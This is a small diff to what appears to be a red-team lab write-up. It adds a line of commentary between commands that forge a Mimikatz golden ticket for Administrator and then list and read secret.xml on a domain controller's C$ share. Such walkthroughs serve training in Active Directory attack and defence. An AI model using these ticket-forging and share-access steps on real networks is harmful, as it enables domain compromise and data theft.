@@ -485,10 +485,11 @@ kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-23
 misc::cmd
 ```
 
-
+We verify that we can read the Secret.xml file
 ```python
 dir \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\
 ```
+
 
 ```python
 type \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\secret.xml
